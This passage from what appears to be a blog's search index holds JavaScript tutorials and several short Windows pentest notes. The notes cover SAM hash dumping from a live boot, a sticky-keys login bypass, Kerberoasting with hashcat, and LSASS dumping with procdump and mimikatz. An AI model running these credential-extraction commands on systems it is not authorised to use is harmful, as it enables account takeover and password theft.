still “failed” because of CORS issues, but again, this may not matter if the POST request was sent.Looking at our proxy history we see the following:We can see that the correct headers were added to the OPTIONS response which means the browser will perform the POST request. The POST request still “failed” because there are still missing CORS headers on the response.If we wanted no errors, the following response headers need to be added: Access-Control-Allow-Origin: https://node-security.com Access-Control-Allow-Credentials: trueSummaryOPTIONS requests are sent when additional headers have been added to cross-origin requests. The request is a preflight check to see if the origin is allowed to perform the request.Security ImplicationsThe question we want to ask is do OPTIONS requests provide protection against CSRF attacks? This is similar to asking if CORS provides protection against CSRF attacks?The answer to both of these, annoyingly, is yes and no. There are situations when it does, but also situations when it doesn’t.A better answer is that it’s not a reliable protection mechanism against CSRF. Better mechanisms include Anti-CSRF tokens (sometimes), utilizing the SameSite flag on cookies, and checking the Origin header server-side." }, { "title": "Admin to SYSTEM with PsExec", "url": "/posts/admin-to-system-with-psexec/", "categories": "security, windows", "tags": "security, windows, privesc", "date": "2021-05-14 20:01:12 +1100", "snippet": "Escalate from admin to SYSTEM on a windows machine by doing the following.Download ToolsDownload Sysinternals Suite from Microsoft here.From Admin to SYSTEMRun the following command in an Admin command prompt:PsExec64.exe -i -s -d -accepteula cmd Additional info here." }, { "title": "Extract NTLM Hashes via Linux Live Boot", "url": "/posts/extract-ntlm-hashes-via-linux-live-boot/", "categories": "security, windows", "tags": "security, windows, sam, system, kali, samdump2, passwords, hashes, ntlm", "date": "2021-05-13 21:43:05 +1100", "snippet": "Using a live boot of Linux, we can extract the NTLM hashes of the windows accounts on a computer and attempt to crack to find out the passwords. Prerequisites Mount Drive Dump HashesPrerequisites Physical access to a Windows Machine without BitLocker Bootable Linux USB (ideally Kali)Mount DriveCreate a new directory where the drive will be mounted:mkdir FOLDER_NAMEList Block Devices:lsblkMount the primary windows partition (it should be the largest one there):mount /dev/PARTITION_NAME FOLDER_NAME FOLDER_NAME is the folder created aboveDump HashesNavigate to Windows/System32/config in the mounted drive and run:samdump2 SYSTEM SAM Hashes will be in PWDump format &amp;lt;username&amp;gt;:&amp;lt;uid&amp;gt;:&amp;lt;LM-hash&amp;gt;:&amp;lt;NTLM-hash&amp;gt;:&amp;lt;comment&amp;gt;:&amp;lt;homedir&amp;gt;:" }, { "title": "Sticky Keys Windows Login Bypass", "url": "/posts/sticky-keys-windows-login-bypass/", "categories": "security, windows", "tags": "security, windows, kali, passwords, privesc", "date": "2021-05-12 20:02:54 +1100", "snippet": "Using a live boot of Linux, we can bypass windows login by changing the sticky keys executable to command prompt. When at the windows login screen, stick keys can be activated to spawn a shell running as SYSTEM. A new user can be created, or the password can be changed for an existing account. Prerequisites Mount Drive Update EXE Names Bypass Login Change a Password Create new Admin Delete User Prerequisites Physical access to a Windows Machine without BitLocker Bootable Linux USB (ideally Kali)Mount DriveCreate a new directory where the drive will be mounted:mkdir FOLDER_NAMEList Block Devices:lsblkMount the primary windows partition (it should be the largest one there):mount /dev/PARTITION_NAME FOLDER_NAME FOLDER_NAME is the folder created aboveUpdate EXE NamesNavigate to Windows/System32/config in the mounted driveRename the sethc.exe file (this is sticky keys):mv sethc.exe sethcBackup.exeMake a copy of cmd.exe and rename it to sethc.exe:cp cmd.exe sethc.exeBypass LoginWhen at the login screen, pressing shift 5 times should now spawn a shell running as SYSTEM.Change a Passwordnet user USERNAME NEW_PASSWORDCreate new Adminnet user /add USERNAME PASSWORDnet localgroup administrators USERNAME /addDelete Usernet user /delete USERNAME" }, { "title": "How to Kerberoast", "url": "/posts/how-to-kerberoast/", "categories": "security, windows", "tags": "security, windows, kerberos, ad, powershell, passwords, hashes", "date": "2021-05-11 19:32:02 +1100", "snippet": " Prerequisites PowerShell Import &amp;amp; Run Crack TokensPrerequisitesMake sure you’re on a domain joined computer, or are running PowerShell in the context of a domain user.Download the required script from Github here, or a local copy can be found here.PowerShellEnable script execution:powershell –ExecutionPolicy BypassImport &amp;amp; RunImport the Kerberoast module:Import-Module .\\Invoke-Kerberoast.ps1Run Invoke-Kerberoast:Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv -Path kerb.csvCrack TokensFrom the output CSV file, copy the tickets from the Hash column.Paste these tickets into a text file tickets.txt.You can use the following command in PowerShell to attempt to crack the tickets with Hashcat:.\\hashcat64.exe -m 13100 -a 0 .\\tickets.txt .\\rockyou.txt" }, { "title": "LSASS Dumping", "url": "/posts/lsass-dumping/", "categories": "security, windows", "tags": "security, windows, lsass, passwords, hashes, ntlm, mimikatz", "date": "2021-05-10 22:03:25 +1100", "snippet": "Create a dump file of lsass process using multiple different techniques. Task Manager Create Dump File Procdump Download Tools Dump LSASS Minidump Download Minidump Import &amp;amp; Run Minidump Extract Passwords/Hashes with MimikatzTask ManagerCreate Dump File Open Task Manger and locate the LSASS process. It will be called lsass.exe or Local Security Authority Process. Right click on the process and select Create dump file.ProcdumpDownload ToolsDownload Sysinternals Suite from Microsoft here.Dump LSASSRun the following command in an Admin command prompt:procdump64.exe -ma lsass.exe lsass.dmpMinidumpDownload MinidumpDownload the required script from Github here, or a local copy can be found here.Import &amp;amp; Run MinidumpImport Minidump module:Import-module .\\Out-Minidump.ps1Run the module and dump the process:Get-Process lsass | Out-MinidumpExtract Passwords/Hashes with MimikatzDownload Mimikatz from GitHub here.Open mimikatz.exe and run:sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords" }, { "title": "NodeJS Express SNI", "url": "/posts/express-sni/", "categories": "javascript, nodejs", "tags": "javascript, express, sni, web, https, http, nodejs, server", "date": "2021-05-01 19:50:58 +1100", "snippet": "In this post we’ll look at how to add SNI (Server Name Indication) to an express HTTPS server. This will allow us to return different certificates based on the domain (server name).This post will assume that you already know how to setup a HTTPS server using express. If you don’t know how to, you can learn here. SNI Callback Function Server Options Full CodeSNI Callback FunctionThe first step will be to create a function that will be called when a new TLS connection is received. This function decides which certificate and private key to use based on the server name.const sniDefaultCert = fs.readFileSync(path.join(__dirname, &#39;certs/normal.crt&#39;));const sniDefaultKey = fs.readFileSync(path.join(__dirname, &#39;certs/normal.key&#39;));const sniCallback = (serverName, callback) =&amp;gt; { let cert = null; let key = null; if (serverName === &#39;testing.com&#39;) { cert = fs.readFileSync(path.join(__dirname, &#39;certs/testing.crt&#39;)); key = fs.readFileSync(path.join(__dirname, &#39;certs/testing.key&#39;)); } else { cert = sniDefaultCert; key = sniDefaultKey; } callback(null, new tls.createSecureContext({ cert, key, }));} When a connection is received for testing.com, the testing.crt cert will be used. The normal.crt cert will be used for all other domains.Server OptionsTo enable SNI, we need to add the key SNICallback to the server options Object. The value will be a callback that will be invoked when a new TLS connection is received.const serverOptions = { SNICallback: sniCallback, // Optional: TLS Versions maxVersion: &#39;TLSv1.3&#39;, minVersion: &#39;TLSv1.2&#39;}Full Codenpm i expressconst express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const tls = require(&#39;tls&#39;);const app = express();const PORT = 8443;const sniDefaultCert = fs.readFileSync(path.join(__dirname, &#39;certs/normal.crt&#39;));const sniDefaultKey = fs.readFileSync(path.join(__dirname, &#39;certs/normal.key&#39;));const sniCallback = (serverName, callback) =&amp;gt; { console.log(serverName); let cert = null; let key = null; if (serverName === &#39;testing.com&#39;) { cert = fs.readFileSync(path.join(__dirname, &#39;certs/testing.crt&#39;)); key = fs.readFileSync(path.join(__dirname, &#39;certs/testing.key&#39;)); } else { cert = sniDefaultCert; key = sniDefaultKey; } callback(null, new tls.createSecureContext({ cert, key, }));}const serverOptions = { SNICallback: sniCallback, // Optional: TLS Versions maxVersion: &#39;TLSv1.3&#39;, minVersion: &#39;TLSv1.2&#39;}const server = require(&#39;https&#39;).Server(serverOptions, app);app.get(&#39;/&#39;, (req, res) =&amp;gt; { console.log(req.socket.servername); res.send(`&amp;lt;h1&amp;gt;Welcome&amp;lt;/h1&amp;gt;`);});// Start the Serverserver.listen(PORT, () =&amp;gt; { console.log(`[-] Server Listening on Port ${PORT}`);});" }, { "title": "Docx Templating in JavaScript", "url": "/posts/docx-templating-in-javascript/", "categories": "javascript, programming", "tags": "javascript, programming, docx, nodejs, react", "date": "2021-04-30 15:10:46 +1100", "snippet": "In this guide we’ll look at how to create a docx template and fill out that document using JavaScript. We’ll do this by using the docxtemplater package. This works in both NodeJS and React. Installing Requirements The Code Filling out the Template with JavaScript Direct Values Styling Lists Table Rows Conditional Rendering Helpful Tips Too Much Spacing Error Finding 1 Error Finding 2 Tag Names Installing RequirementsInstall the docxtemplater &amp;amp; pizzip packages using the following command:npm i docxtemplater pizzipThe CodeThe main code for all the below examples will stay the same. The only thing that will be changing is the dataToAdd Object (line 14). All other lines will stay the same.const fs = require(&#39;fs&#39;);const path = require(&#39;path&#39;);const PizZip = require(&#39;pizzip&#39;);const Docxtemplater = require(&#39;docxtemplater&#39;);// Load the templated docx fileconst templateFile = fs.readFileSync(path.resolve(__dirname, &#39;template.docx&#39;), &#39;binary&#39;);const zip = new PizZip(templateFile);try { // Attempt to read all the templated tags let outputDocument = new Docxtemplater(zip); const dataToAdd = {}; // Set the data we wish to add to the document outputDocument.setData(dataToAdd); try { // Attempt to render the document (Add data to the template) outputDocument.render() // Create a buffer to store the output data let outputDocumentBuffer = outputDocument.getZip().generate({ type: &#39;nodebuffer&#39; }); // Save the buffer to a file fs.writeFileSync(path.resolve(__dirname, &#39;OUTPUT.docx&#39;), outputDocumentBuffer); } catch (error) { console.error(`ERROR Filling out Template:`); console.error(error) }} catch(error) { console.error(`ERROR Loading Template:`); console.error(error);}Filling out the Template with JavaScriptAll of the data that will be added to the template will be contained within a single Object called dataToAdd.Each key in the dataToAdd Object refers to a tag that was placed in the docx file. Let’s see how to do this:Direct ValuesDirect values simply mean static values that we wish to insert into the document. Some examples would be the date, author, title. Simple text values you wish to add that may change with each document.Docx FileThe Codeconst dataToAdd = { document_creation_date: (new Date()).toLocaleDateString()};ResultsStylingThe style that is applied to the tag in the document will be inherited by the value that is inserted:Docx FileThe Codeconst dataToAdd = { document_creation_date: (new Date()).toLocaleDateString(), document_author: &#39;Alexander Wells&#39;,};ResultsListsA very useful feature is to be able to template repetitive sections. Perhaps the document is suppose to contain the profiles of some employees. Let’s see how we can use lists to do this:Docx File Lists are prefixed with the # character to start the list scope, and the / character to end the list scope.The Codeconst dataToAdd = { employeeList: [ { id: 28521, name: &#39;Frank&#39;, age: 34, city: &#39;Melbourne&#39; }, { id: 84973, name: &#39;Chloe&#39;, age: 28, city: &#39;Perth&#39; }, ]}; When using lists, the value should be a list of Objects. The keys of each Object will refer to the tags used inside the List in the docx file (id, name, age, city).ResultsTable RowsWe can also use lists to create additional rows of a table. Let’s use the employee example again, but this time let’s use a table to represent the data:Docx FileThe Codeconst dataToAdd = { employeeList: [ { id: 28521, name: &#39;Frank&#39;, age: 34, city: &#39;Melbourne&#39; }, { id: 84973, name: &#39;Chloe&#39;, age: 28, city: &#39;Perth&#39; }, { id: 10349, name: &#39;Hank&#39;, age: 68, city: &#39;Hobart&#39; }, { id: 44586, name: &#39;Gordon&#39;, age: 47, city: &#39;Melbourne&#39; }, ]};ResultsConditional RenderingDocx FileAnother useful feature would be if we could only render certain things if a condition is met. Let’s see how we can do that:The Codeconst dataToAdd = { showDocumentAuthor: true, document_author: &#39;Alexander Wells&#39;,};ResultsChanging showDocumentAuthor to false means the data inside the conditional statement won’t be rendered.Helpful TipsToo Much SpacingYou may notice if you use loops that extra spacing gets added where you don’t want. Let’s look at an example where this is very clear:const dataToAdd = { groceryList: [ { item: &#39;Eggs&#39; }, { item: &#39;Steak&#39; }, { item: &#39;Apples&#39; } ],}; With visible formatting enabled we can see the issue. An extra line has been inserted between each list element.We can fix this by enabling by enabling paragraphLoop option when creating our output document:let outputDocument = new Docxtemplater(zip, { paragraphLoop: true });Error Finding 1 One downside of this library is that error locations is actually a paid feature (yes I’m serious), look here. This is an inconvenience and nothing more. I STRONGLY suggest that you do templating in small batches. Add a few tags, test, add a few more, then test again. Please do not spend hours (or even an hour) templating before testing. It will save you a massive headache when the program just says error, and you have to hunt through your document to find the issue.Error Finding 2 Ensure that your tags in the docx file do not contain spaces at the start or end. If you have a list tag called {#employeeList}, ensure there is no whitespace like this {#employeeList }, as this can cause the program to fail. Microsoft Word can automatically add spaces so before be aware of that.Tag Names USE GOOD TAG NAMES! Just like when programming you try and use good variable names, same goes here. A large document may have dozens or hundreds of tags. Using date for a tag name is BAD! Using document_creation_date is much better as it’s clear exactly what date it’s referring to." }, { "title": "Web Workers", "url": "/posts/web-workers/", "categories": "javascript, programming", "tags": "javascript, web-workers, programming, web, algorithm", "date": "2021-04-29 18:40:58 +1100", "snippet": "This page will demonstrate how to setup Web Workers, dispatch tasks to workers, and send messages/results from workers to the main thread. HTML Page Worker Code Example OutputHTML Page&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Web Workers&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;script type=&quot;text/javascript&quot;&amp;gt; console.log(&#39;Creating Web Worker(s)...&#39;); // Handler function for when a Worker sends a message const workerOnMessageHandler = ({ data }) =&amp;gt; { let { workerId, action, outputData} = data; if (action === &#39;print-data&#39;) { console.log(...outputData); } else if (action === &#39;randomNumber&#39;) { console.log(`Random Number Results from Worker ${workerId}:`, outputData); } } // How many Workers we want to create const totalWorkers = 4; const randomNumberRange = 1000; // List to store our Workers let workerList = []; // Create Workers for (let i = 0; i &amp;lt; totalWorkers; ++i) { // Create a new random number Worker let workerObj = new Worker(&#39;worker-randomNumber.js&#39;); // Set the callback for when the Worker posts a message workerObj.onmessage = workerOnMessageHandler; // Add the Worker to the Worker list workerList.push({ workerId: i, action: &#39;randomNumber&#39;, workerObj }) } // Send a task to each Worker for (let i = 0; i &amp;lt; workerList.length; ++i) { workerList[i].workerObj.postMessage({ workerId: workerList[i].workerId, action: &#39;randomNumber&#39;, inputData: randomNumberRange }); } &amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; The postMessage function calls the function stored in self.onmessage inside the Web Worker (see below).Worker Codeconst printMessage = (workerId, ...msg) =&amp;gt; { self.postMessage({ workerId, action: &#39;print-data&#39;, outputData: msg });}const calculations = (inputData) =&amp;gt; { return Math.round(Math.random()*inputData);}self.onmessage = ({ data }) =&amp;gt; { let { workerId, action, inputData } = data; // Print the string to the screen printMessage(workerId, `Worker (${workerId}) Received Data:`, inputData); // Calculate results let result = calculations(inputData); // Return results self.postMessage({ workerId, action, outputData: result });} The postMessage function here calls the function stored in workerObj.onmessage that was set for this Worker in the main thread.Example Output NOTE there is no guarantee that the tasks will finish in any sort of order. The order will very likely change every time the program is run." }, { "title": "Web-Sockets - Socket.IO", "url": "/posts/websockets-socketio/", "categories": "javascript, nodejs", "tags": "javascript, web-sockets, socketio, http, https, nodejs, express, react", "date": "2021-04-29 17:33:02 +1100", "snippet": "This guide will demonstrate how to setup an express webserver that uses Socket.IO for communication. Installing Requirements Backend Code Frontend Code Standard HTML Page React Installing RequirementsInstall the express and socket.io packages using the following command:npm i express socket.ioBackend Codeconst express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const ws = require(&#39;ws&#39;);const app = express();const HOSTNAME = &#39;testing.com&#39;;const PORT = 8443;// TLS Optionsconst serverOptions = { cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;))}const httpServer = require(&#39;https&#39;).Server(serverOptions, app);const io = require(&#39;socket.io&#39;)(httpServer);// New WebSocket Connectionio.on(&#39;connection&#39;, (socket) =&amp;gt; { // Verify cookie is valid here let cookie = socket.handshake?.headers?.cookie || &#39;N/A&#39;; socket.on(&#39;/endpoint/1&#39;, (msg) =&amp;gt; { console.log(&#39;/endpoint/1&#39;, msg); }); socket.on(&#39;/endpoint/2&#39;, (msg) =&amp;gt; { console.log(&#39;/endpoint/2&#39;, msg); socket.emit(&#39;/api/connected&#39;, &#39;Connection Success&#39;); }); socket.on(&#39;/close-socket&#39;, () =&amp;gt; { socket.disconnect(); }); socket.on(&#39;disconnect&#39;, () =&amp;gt; { console.log(&#39;Socket Closed:&#39;, socket.id); });});// Don&#39;t allow standard WebSocket Connections httpServer.on(&#39;upgrade&#39;, (request, socket) =&amp;gt; { console.log(&#39;here&#39;); socket.destroy();});app.get(&#39;/&#39;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &#39;index.html&#39;));});// Start the ServerhttpServer.listen(PORT, () =&amp;gt; { console.log(`[-] Server Listening on Port ${PORT}`);});Frontend CodeStandard HTML Page&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;WebSocket - Socket IO&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;h4&amp;gt;WebSocket - Socket IO&amp;lt;/h4&amp;gt; &amp;lt;script src=&quot;/socket.io/socket.io.js&quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; const socket = io(&#39;https://testing.com:8443&#39;); socket.on(&#39;connect&#39;, () =&amp;gt; { console.log(&#39;CONNECTED&#39;); socket.emit(&#39;/endpoint/2&#39;, &#39;Test Message&#39;); }); socket.on(&#39;disconnect&#39;, () =&amp;gt; { console.log(&#39;DISCONNECTED&#39;); }); socket.on(&#39;/api/connected&#39;, (msg) =&amp;gt; { console.log(`MSG:`, msg); }); setTimeout(() =&amp;gt; { socket.emit(&#39;/endpoint/2&#39;, &#39;Test Message&#39;); }, 1000) &amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;ReactTo use Socket.IO with React we need to do the following:npm i socket.io-clientimport openSocket from &#39;socket.io-client&#39;;let socket = openSocket(&#39;https://testing.com:8443&#39;); You can then use the library as normal." }, { "title": "Web-Sockets - Native", "url": "/posts/websockets-native/", "categories": "javascript, nodejs", "tags": "javascript, web-sockets, http, https, nodejs, express", "date": "2021-04-29 12:28:07 +1100", "snippet": "This guide will demonstrate how to setup an express webserver that uses built-in browser WebSockets for communication. Installing Requirements Backend Code Frontend CodeInstalling RequirementsInstall the express &amp;amp; ws packages using the following command:npm i express wsBackend Codeconst express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const ws = require(&#39;ws&#39;);const app = express();const HOSTNAME = &#39;testing.com&#39;;const PORT = 8443;// TLS Optionsconst serverOptions = { cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;))}const httpServer = require(&#39;https&#39;).Server(serverOptions, app);const webSocketServer = new ws.Server({ noServer: true });// Handle WebSocket Connections (After Upgrade)webSocketServer.on(&#39;connection&#39;, (socket, req) =&amp;gt; { console.log(&#39;New WebSocket connection&#39;, req.socket.remoteAddress); socket.on(&#39;message&#39;, (msg) =&amp;gt; { console.log(&#39;New MSG:&#39;, msg); socket.send(&#39;Received&#39;); }); socket.on(&#39;error&#39;, (err) =&amp;gt; { console.log(&#39;ERROR:&#39;, err); socket.terminate(); });});// Handle WebSocket UpgradehttpServer.on(&#39;upgrade&#39;, (request, socket, head) =&amp;gt; { // Connection IP console.log(`Remote Address: ${socket.remoteAddress}`); // Check the Origin is correct, prevent CSWSH (Cross-Site Web-Socket Hijacking) if (request.headers.origin === `https://${HOSTNAME}:${PORT}`) { // Check Cookie is valid here console.log(request.headers.cookie); // Upgrade the connection to a WebSocket webSocketServer.handleUpgrade(request, socket, head, (newSocket) =&amp;gt; { webSocketServer.emit(&#39;connection&#39;, newSocket, request) }); } else { // Origin was incorrect, reject connection socket.write(&#39;HTTP/1.1 401 Unauthorized\\r\\nConnection: close\\r\\n\\r\\n&#39;); socket.destroy(); }})app.get(&#39;/&#39;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &#39;index.html&#39;));});// Start the ServerhttpServer.listen(PORT, () =&amp;gt; { console.log(`[-] Server Listening on Port ${PORT}`);});Frontend Code&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;WebSockets - Native&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;h4&amp;gt;WebSockets - Native&amp;lt;/h4&amp;gt; &amp;lt;script&amp;gt; connectSocket = (url, params) =&amp;gt; { let socket = new WebSocket(url, params); socket.onopen = () =&amp;gt; { console.log(&quot;OPENED&quot;); socket.send(&#39;Test Message&#39;); } socket.onmessage = (msg) =&amp;gt; { console.log(`MSG: &quot;${msg.data}&quot;`); } socket.onerror = (err) =&amp;gt; { console.log(&quot;ERROR&quot;, err); } socket.onclose = () =&amp;gt; { console.log(&quot;CLOSED&quot;); } return socket; } let socket = connectSocket(&#39;wss://testing.com:8443&#39;); &amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;" }, { "title": "Creating XLSX Documents in Javascript (Advanced)", "url": "/posts/creating-xlsx-documents-in-javascript-advanced/", "categories": "javascript, programming", "tags": "javascript, programming, xlsx, excel, nodejs, react", "date": "2021-04-24 18:39:40 +1100", "snippet": "In this post we’ll look at how to create XLSX documents in JavaScript with more advanced features such as custom styling and formulas using the xlsx &amp;amp; js-xlsx packages. This works in both NodeJS and React. What we are Making Installing Requirements Data Types String Date Number Styling Font Alignment Fill Formulas How do I Make it Work? Formula Example What we are Making If you only need to write text to your XLSX document and don’t require any styling, then the basic version of this guide may be quicker and more suitable.Installing RequirementsInstall the xlsx &amp;amp; js-xlsx packages using the following command:npm i xlsx js-xlsxData TypesEach sheet in the document will be represented by an Object. The keys of this Object will be the name of the cells (A1, A2, B2, etc).Each cell in our output document will be represented by another Object. This object will contain information such as the value of the cell, styling, and the output format (number, date, percentage, etc).More information about supported data types can be found on the XLSX package documentation page here.Time for examples!String// import XLSX from &#39;xlsx&#39;; // Use this for Reactconst XLSX = require(&#39;xlsx&#39;);const JS_XLSX = require(&#39;js-xlsx&#39;);// Create a new blank XLSX Documentlet workbook = XLSX.utils.book_new();// The data that will be added to the sheetlet worksheetData = { &#39;!ref&#39;: &#39;A1:A1&#39;, // Sheet Range (Which cells will be included in the output) &#39;A1&#39;: { t: &#39;s&#39;, // Type v: &#39;Test String!&#39;, // Value },};// Add the sheet to the workbookXLSX.utils.book_append_sheet(workbook, worksheetData, &#39;Sheet 1&#39;);// Save the XLSX FileJS_XLSX.writeFile(workbook, &#39;FILE_NAME.xlsx&#39;); The !ref must contain the output range of the sheet. Cells that are not in this range will not be rendered. The t key in the A1 Object stands for Type. The value of &#39;s&#39; stands for String/Text. The v key in the A1 Object stands for Value. The value here is the text we want in the cell.DateTo insert a Date, we use the a value of &#39;d&#39; in the Type field:let worksheetData = { &#39;!ref&#39;: &#39;A1:B1&#39;, &#39;A1&#39;: { t: &#39;s&#39;, v: &#39;Test String!&#39; }, &#39;B1&#39;: { t: &#39;d&#39;, // Type v: (new Date()) // Value }};NumberWhen working with numbers we need to specify the number format. We do this by adding another key s which stands for Style/Theme. An Object must be provided as the value and contain a key called numFmt which specifies the number format (Integer, Float, Percentage, Fraction, etc).let worksheetData = { &#39;!ref&#39;: &#39;A1:C2&#39;, &#39;A1&#39;: { t:&#39;n&#39;, // Type v: 256, // Value s: { numFmt: 1 } // Style }, &#39;B1&#39;: { t:&#39;n&#39;, v: 3.14159, s: { numFmt: 2 } }, &#39;C1&#39;: { t:&#39;n&#39;, v: 0.47836, s: { numFmt: 10 } }, &#39;A2&#39;: { t:&#39;n&#39;, v: 0.47836, s: { numFmt: 11 } }, &#39;B2&#39;: { t:&#39;n&#39;, v: 0.47836, s: { numFmt: 12 } }, &#39;C2&#39;: { t:&#39;n&#39;, v: 21567.489, s: { numFmt: &#39;_-&quot;$&quot;* #,##0.00_-;\\\\-&quot;$&quot;* #,##0.00_-;_-&quot;$&quot;* &quot;-&quot;??_-;_-@_-&#39; }, },}; numFmt: 1 means Integer (1, 2, 3 , etc). numFmt: 2 means Float (0.523, 11.25, etc). numFmt: 10 means Percentage (0.85%, 59.23%, etc). numFmt: 11 means Scientific Notation (3.94E+03, 6.85E-01, etc). numFmt: 12 means Single Digit Fraction (1/3, 6/7, etc). numFmt: &#39;_-&quot;$&quot;* #,##0.00_-;\\\\-&quot;$&quot;* #,##0.00_-;_-&quot;$&quot;* &quot;-&quot;??_-;_-@_-&#39; mean Accounting mode ($23,582.64, $0.32, etc). A more complete list of these codes can be found here.StylingWe can modify the styling by supplying additional parameters to the Object in the s field.Documentation with additional options can be found here.Fontlet worksheetData = { &#39;!ref&#39;: &#39;A1:B1&#39;, &#39;A1&#39;: { t: &#39;s&#39;, v: &#39;String 1&#39;, s: { font: { name: &#39;Verdana&#39;, sz: 20, bold: true, underline: true, italic: true, color: { rgb: &#39;FF12A304&#39; }, // Hex Value: ARGB } } }, &#39;B1&#39;: { t: &#39;s&#39;, v: &#39;String 2&#39;, s: { font: { name: &#39;Times New Roman&#39;, sz: 10, strike: true, } } },};Alignmentlet worksheetData = { &#39;!ref&#39;: &#39;A1:B1&#39;, &#39;A1&#39;: { t: &#39;s&#39;, v: &#39;String 1&#39;, s: { font: { name: &#39;Verdana&#39;, }, alignment: { horizontal: &#39;left&#39;, vertical: &#39;bottom&#39;, } } }, &#39;B1&#39;: { t: &#39;s&#39;, v: &#39;String 2&#39;, s: { font: { name: &#39;Arial&#39;, }, alignment: { horizontal: &#39;right&#39;, vertical: &#39;top&#39;, } } },};Filllet worksheetData = { &#39;!ref&#39;: &#39;A1:B1&#39;, &#39;A1&#39;: { t:&#39;s&#39;, v: &#39;COLOURS!&#39;, s: { font: { name: &#39;IMPACT&#39;, sz: 32, color: { rgb: &#39;FFE609EA&#39; }, // ARGB Hex Value }, fill: { fgColor: { rgb: &#39;FF0269D8&#39; }, // ARGB Hex Value }, alignment: { horizontal: &#39;center&#39;, vertical: &#39;center&#39;, } } },};FormulasAt the time of writing the js-xlsx module doesn’t yet support formulas. This is inconvenient because the xlsx module does support formulas, but it doesn’t support styling. We don’t want to choose between styling and formulas, we want both.Luckily, there are smart people who’ve had the same issue and made a fix!How do I Make it Work?For reference the package versions being used in this guide are: js-xlsx: 0.8.22 xlsx: 0.16.9From the above screenshot we can add formula support into js-xlsx with 2 small code changes: Open the file node_modules/js-xlsx/xlsx.js. Replace line 7685 with the following line: if ( ! (cell.v || cell.s || cell.f ) ) return &quot;&quot;; Replace line 7710 with the following 2 lines: var o = { r: ref };var v = cell.f ? writetag(&#39;f&#39;, escapexml(cell.f)) : writetag(&#39;v&#39;, escapexml(vv)); Done!!!Formula ExampleTo add a formula we need to create an f key in our cell Object and store our formula there:let worksheetData = { &#39;!ref&#39;: &#39;A1:E2&#39;, // Generate some random values in the second row &#39;A2&#39;: { t: &#39;n&#39;, v: Math.round(Math.random()*100), s: { numFmt: 1 } }, &#39;B2&#39;: { t: &#39;n&#39;, v: Math.round(Math.random()*100), s: { numFmt: 1 } }, &#39;C2&#39;: { t: &#39;n&#39;, v: Math.round(Math.random()*100), s: { numFmt: 1 } }, &#39;D2&#39;: { t: &#39;n&#39;, v: Math.round(Math.random()*100), s: { numFmt: 1 } }, // Add a header &#39;E1&#39;: { t: &#39;s&#39;, v: &#39;Total Sum&#39;, s: { font: { bold: true, underline: true } } }, // Add formula &#39;E2&#39;: { t: &#39;n&#39;, f: &#39;SUM(A2:D2)&#39; },};" }, { "title": "Creating XLSX Documents in Javascript (Basic)", "url": "/posts/creating-xlsx-documents-in-javascript-basic/", "categories": "javascript, programming", "tags": "javascript, programming, xlsx, excel, nodejs, react", "date": "2021-04-24 14:53:16 +1100", "snippet": "In this post we’ll look at how to create basic XLSX documents in JavaScript using the xlsx package. This works in both NodeJS and React. What we are Making Installing Requirements The CodeWhat we are Making We’ll look at how to add styling and formulas here in the advanced version of this guide.Installing RequirementsInstall the xlsx package using the following command:npm i xlsxThe CodeTo generate the above example, our output data needs to be an Array of String Arrays. Each Array represents a single row in the document:// import XLSX from &#39;xlsx&#39;; // Use this for Reactconst XLSX = require(&#39;xlsx&#39;);// Create a new blank XLSX Documentlet workbook = XLSX.utils.book_new();// The data that will be added to the sheetlet dataForSheet = [ [&#39;Column 1&#39;, &#39;Column 2&#39;,&#39;Column 3&#39;,&#39;Column 4&#39;,&#39;Column 5&#39;,&#39;Column 6&#39;], [&#39;Data 1&#39;, &#39;Data 2&#39;,&#39;Data 3&#39;,&#39;Data 4&#39;,&#39;Data 5&#39;,&#39;Data 6&#39;], [&#39;Data 7&#39;, &#39;Data 8&#39;,&#39;Data 9&#39;,&#39;Data 10&#39;], [&#39;Data 11&#39;, &#39;Data 12&#39;,&#39;&#39;,&#39;&#39;,&#39;Data 13&#39;,&#39;Data 14&#39;,&#39;Data 15&#39;],];// Convert the Array data to a sheetlet sheetData = XLSX.utils.aoa_to_sheet(dataForSheet);// Add the sheet to the workbookXLSX.utils.book_append_sheet(workbook, sheetData, &#39;Sheet 1&#39;);// Save the XLSX File.XLSX.writeFile(workbook, &#39;FILE_NAME.xlsx&#39;); NOTE: Multiple sheets can be added to a single workbook (document)." }, { "title": "Building a Plexus", "url": "/posts/building-a-plexus/", "categories": "javascript, programming", "tags": "javascript, programming, p5.js, algorithm, plexus, fun", "date": "2021-04-16 23:53:16 +1100", "snippet": "In this post we’ll look at how to build a Plexus in JavaScript using the p5.js library. What we are Making How we will make it Setup p5.js Points Generating Points Drawing Points Lines Draw Lines to Nearby Points Fading Line Colour Moving Points Conclusion More Ideas Colour Change Horizontal Only Vertical Only Horizontal &amp;amp; Vertical Full CodeWhat we are MakingOur 